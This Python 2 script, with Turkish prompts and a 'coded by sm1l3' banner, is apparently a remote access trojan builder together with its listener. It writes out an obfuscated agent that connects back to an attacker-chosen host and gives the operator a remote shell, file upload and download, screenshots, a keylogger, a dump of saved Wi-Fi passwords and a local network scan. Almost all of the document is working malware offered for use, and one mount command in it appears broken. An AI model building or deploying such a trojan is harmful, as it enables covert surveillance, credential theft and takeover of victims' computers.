import socket
import os
import subprocess
import getpass
import random
import shutil
import sys
import string
import colorama
from colorama import Fore, Back, Style
colorama.init()
print """coded by sm1l3
:'######::'##::::'##::::'##:::'##::::::::'#######::
'##... ##: ###::'###::'####::: ##:::::::'##.... ##:
 ##:::..:: ####'####::.. ##::: ##:::::::..::::: ##:
. ######:: ## ### ##:::: ##::: ##::::::::'#######::
:..... ##: ##. #: ##:::: ##::: ##::::::::...... ##:
'##::: ##: ##:.:: ##:::: ##::: ##:::::::'##:::: ##:
. ######:: ##:::: ##::'######: ########:. #######::
:......:::..:::::..:::......::........:::.......:::
"""
lhost = raw_input("rat baglanti ip tirnak icinde giriniz 'localhost'--> ")
dosyad = raw_input("dosya adi--> ")
host = raw_input("ip -> ")

dport = raw_input("trojan port -> ")
port = input("sinleyici port -> ")

chardiz="""
#b2b6e22d0c699e42b2cb681a057d585e8c8d4cd151bd35b21bc6e6bde89074d5
import socket
import os
import subprocess
import getpass
import random
import shutil
import sys
import string
import time
import base64

ch = string.uppercase + string.digits
#"8960ef1f0396276ae897597158c65e4f"
token = "".join(random.choice(ch) for i in range(32))
pid = os.getpid()
#"e8ffbd2efa259ffe21a77ead40bca007"
if os.path.isdir("/tmp/{0}".format(token)) is False:

        os.system("mkdir /tmp/{1} &&  diskpart && select volume 1 && assignmount= /tmp/{1} /proc/{0}".format(pid,token))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
x = base64.encodestring("""+lhost+""")

host = base64.decodestring(x) 
port = """+dport+"""


s.connect((host, port))
random.random()
#"ef498b053ef0a10de1881dbf87a2c44d"
while True:
    
    komut = s.recv(1024)
    komut = komut.decode()
    #"0c70b9cd58e17ae2217433faedcee0a9"
    
    if komut == base64.decodestring("d2hlcmVfYW1faQ=="):
        
        files = os.getcwd()
        files = str(files)
        random.random()
        #"efd4055a1329ee3ff627cad5864e6e1b"
        s.send(files)
       
    if komut == base64.decodestring("ZGly"):
        user_input = s.recv(5000)
        user_input =user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())

    
    if komut == base64.decodestring("dHJhbnNmZXJfZGxvYWQ="):
        dosyayolu = s.recv(5000)
        dosyayolu = dosyayolu.decode()
        
        dosya = open(dosyayolu, "rb")
        veri = dosya.read()
        s.send(veri.encode())

        random.random()

       
    if komut == base64.decodestring("dHJhbnNmZXJfc2VuZA=="):
        dosya = s.recv(7000)
        yeni = open(dosya, "wb")
        veri = s.recv(7000) 
        yeni.write(veri)
        yeni.close()
    
    
    if komut == base64.decodestring("c2hlbGw="):
        #"efd4055a1329ee3ff627cad5864e6e1b"
        random.random()
        while True:
            veri = s.recv(1024)
            veri = veri.decode()
            CMD = subprocess.Popen(veri, shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            cmd = (CMD.stdout.read())
            cmd2 = (CMD.stderr.read())
            cmd3 = cmd + cmd2
            s.send(cmd3)
            
        
    
    
    if komut == base64.decodestring("c2NyZWVuc2hvdA=="):
        #"ef498b053ef0a10de1881dbf87a2c44d"
        from PIL import ImageGrab
        
        def ekranGrountusuAl(sDosyaAdi):
            
            resim = ImageGrab.grab()
            adi=sDosyaAdi+".jpg"
            resim.save(adi,'JPEG')
          
                
        ekranGrountusuAl("ekranresmi")
        f = base64.encodestring("ekranresmi.jpg")
        dosyayolu = base64.decodestring(f)
    
        dosya = open(dosyayolu, "rb")
        veri = dosya.read()
        s.send(veri)
        dosya.close()
        os.remove("ekranresmi.jpg")

    #"ef498b053ef0a10de1881dbf87a2c44d"
    g = "bW9kdWxlX2tleWxvZ2dlcg=="

    if komut == base64.decodestring(g):
        random.random()
        #"ef498b053ef0a10de1881dbf87a2c44d"
        from pynput.keyboard import Key, Listener
        
        def on_press(key):
            s.send((str(key)))
            
        with Listener(on_press = on_press) as Listener:
            Listener.join()
            #"ef498b053ef0a10de1881dbf87a2c44d"

    

        
    h = "bW9kdWxlX3N0b3JlZC93aWZpcy9kdW1wZXI="
    if komut == base64.decodestring(h):
        random.random()
        wifis = subprocess.Popen(['netsh', 'wlan', 'show', 'profiles'], shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        wifi = wifis.stdout.read() + wifis.stderr.read()
        s.send(str(wifi))
        user_input = s.recv(5000)
        dump = subprocess.Popen(['netsh', 'wlan', 'show', 'profile', user_input, 'key=clear'], shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        dumped = dump.stdout.read() + dump.stderr.read()
        s.send(dumped)
        random.random()
        
        

    i =  "bW9kdWxlX25ldHdvcmsvaXAvc2Nhbm5lcg=="
    if komut == base64.decodestring(i):
            random.random()
            net1 = s.recv(5000)
            net2 = net1.split('.')
            a = '.'
            net3 = net2[0] + a + net2[1] + a + net2[2] + a
            stn1 = int(s.recv(5000))
            edn1 = int(s.recv(5000))
            edn1 = edn1 + 1
            def scan(addr):
                    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    socket.setdefaulttimeout(1)
                    result = sock.connect_ex((addr,135))
                    if result == 0 :
                            return 1
                    else :
                            return 0

            def run():
                    for ip in xrange(stn1,edn1):
                            addr = net3+str(ip)
                            if (scan(addr)):
                                    s.send(addr)
            run()
            random.random()
"""







s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


ad = open(dosyad+".py", "wb+")
ad.write(chardiz)
ad.close()
print ("dosya olusturuldu---> ",dosyad)
print (Fore.GREEN)
print (Style.BRIGHT)
print "dinleyici baslatildi..."
print "baglanti bekleniyor..."





s.bind((host, port))

s.listen(10)  

conn, addr = s.accept()



while True:
    print(Fore.RED)
    print(Style.BRIGHT)
    komut = raw_input(str("sm1l3.acces#-> "))
    print(Fore.RESET)
    if komut == "where_am_i":
        conn.send(komut.encode())
       
        files = conn.recv(5000)
        
        print(files)
            
          
    if komut == "help":
        print ("")
        print ("where_am_i")
        print ("")
        print ("dir")
        print ("")
        print ("transfer_send")
        print ("")
        print ("transfer_dload")       
        print ("")
        print ("modules")
        print ""
        print "shell"
        print ""
        print "screenshot"
        print ""
    
        
        

    if komut == "dir":
        conn.send(komut.encode())
        user_input = raw_input("dizin: ")
        conn.send(user_input.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(files)
        
    if komut == "transfer_dload":
        
        conn.send(komut.encode())
        dosyayolu = raw_input("dosya adi--> ")
        conn.send(dosyayolu.encode())
        dosya = conn.recv(100000)
        
        dosyadi = raw_input("dosyanin kayit edileceigi isim -> ")
        yeni = open(dosyadi, "wb")
        yeni.write(dosya)
        yeni.close()
        print(dosyadi , "indirildi")


    if komut == "transfer_send":
        conn.send(komut.encode())
        dosya = raw_input("dosya -> ")
        dosyadi = raw_input("iletilecek isim-> ")
        veri = open(dosya, "rb")
        dosyaveri = veri.read(7000)
        conn.send(dosyadi.encode())
        print(dosya,"iletildi.")
        conn.send(dosyaveri)

    if komut == "shell":
        print "eger shell oturumundan cikmak isterseniz quit yazin..."
        conn.send(komut.encode())
        while True:
            
            shell = raw_input("shell-> ")
            conn.send(shell)
            print (conn.recv(1024))
            if shell == "quit":
                break
            
    if komut == "modules":
        print ""
        print "module_keylogger"
        print ""
        print "module_stored/wifis/dumper"
        print ""
        print "module_network/ip/scanner"
        print ""
        
        

    if komut == "screenshot":
        conn.send(komut.encode())
        
        dosya = conn.recv(100000)
        
        dosyadi = raw_input("kayit edliecek dosya adi -> ")
        yeni = open(dosyadi, "wb")
        yeni.write(dosya)
        yeni.close()
        print ("ekran goruntusu kayit edildi", dosyadi)

        
    if komut == "module_keylogger":
        conn.send(komut.encode())
        print "eger keyloggerdan cikmak isterseniz quit yazin girdileri gormek icin ise entere basin."
        while True:
            keys = conn.recv(5000)
            
            
            kayit = raw_input(keys)
            
            if kayit == "quit":
                break



    if komut == "module_stored/wifis/dumper":
        conn.send(komut.encode())
        wifis = conn.recv(5000)
        print (wifis)
        user_input = raw_input("wifi agi secin -> ")
        conn.send(user_input)
        dumped = conn.recv(5000)
        print (dumped)
         
         
        
         
         
   
    if komut == "module_network/ip/scanner":
        conn.send(komut.encode())
        iparalik = raw_input("local ip araligi giriniz -> ")
        conn.send(iparalik)
        ilk = raw_input("taramanin baslanacagi sayiyi girin -> ")
        conn.send(ilk)
        son = raw_input("taramanin bitecegi sayiyi girin -> ")
        conn.send(son)
        print "tarama basladi"
        adresler = conn.recv(5000)
        print(adresler)
        
      
        
        
        
    
































         
         
        
        
